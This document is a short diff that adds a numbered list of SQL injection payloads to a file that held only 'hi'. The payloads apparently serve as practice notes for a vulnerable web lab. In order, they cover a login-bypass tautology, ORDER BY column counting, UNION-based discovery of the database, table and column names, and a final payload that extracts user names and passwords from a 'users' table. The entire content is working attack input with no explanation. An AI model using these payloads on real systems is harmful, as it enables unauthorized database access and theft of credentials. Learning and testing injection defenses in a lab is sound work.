@@ -1,1 +1,10 @@
-hi
+(1)   1' OR '1'='1
+(2) 1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+(3)1' UNION SELECT 1,2-- -
+(4)1' UNION SELECT database(),2-- -
+(5)1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+(6)1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+(7)1' UNION SELECT user,password FROM users-- -
